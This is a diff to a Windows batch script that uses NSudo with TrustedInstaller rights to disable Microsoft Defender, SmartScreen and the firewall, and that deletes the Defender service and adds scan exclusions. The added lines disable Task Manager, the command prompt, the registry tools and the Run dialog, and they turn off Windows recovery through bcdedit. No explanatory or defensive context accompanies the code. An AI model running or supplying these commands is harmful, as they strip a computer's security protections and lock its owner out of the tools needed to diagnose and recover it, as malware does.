@@ -36,6 +36,14 @@ NSudo -U:T -ShowWindowMode:Hide icacls "%pop%\System32\smartscreen.exe" /inherit
 
 NSudo -U:T reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
  
+NSudo -U:T reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
+
+NSudo -U:T reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
+
+NSudo -U:T reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
+
+NSudo -U:T reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
+ 
 NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend  
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
@@ -68,3 +76,7 @@ powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
 powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 
 powershell.exe -command "netsh advfirewall set allprofiles state off"
+
+bcdedit /set {default} recoveryenabled No
+
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
